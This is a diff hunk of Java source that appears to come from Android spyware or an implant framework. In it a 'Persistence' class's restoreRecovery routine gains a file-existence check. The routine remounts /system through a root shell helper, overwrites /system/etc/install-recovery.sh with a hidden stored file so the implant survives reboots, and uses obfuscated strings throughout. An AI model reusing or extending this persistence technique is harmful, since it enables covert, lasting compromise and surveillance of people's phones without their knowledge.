@@ -126,13 +126,16 @@ public class Persistence {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (restoreRecovery) ");
 		}
-		// Remount /system
-		Execute.execute(Configuration.shellFile + " " + "blw");
-		
-		Execute.execute(Configuration.shellFile + " " + "fhc" + " " + storageDir + "/" + getName() + Cfg.RANDOM.substring(7, 8) + " " + M.e("/system/etc/install-recovery.sh"));
-		
-		// Return /system to normal
-		Execute.execute(Configuration.shellFile + " " + "blr");
+
+		AutoFile file = new AutoFile(storageDir + "/" + getName() + Cfg.RANDOM.substring(7, 8));
+		if(file.exists()) {
+			// Remount /system
+			Execute.execute(Configuration.shellFile + " " + "blw");
+			Execute.execute(Configuration.shellFile + " " + "fhc" + " " + storageDir + "/" + getName() + Cfg.RANDOM.substring(7, 8) + " " + M.e("/system/etc/install-recovery.sh"));
+
+			// Return /system to normal
+			Execute.execute(Configuration.shellFile + " " + "blr");
+		}
 	}
 	
 	private boolean genStorage() {
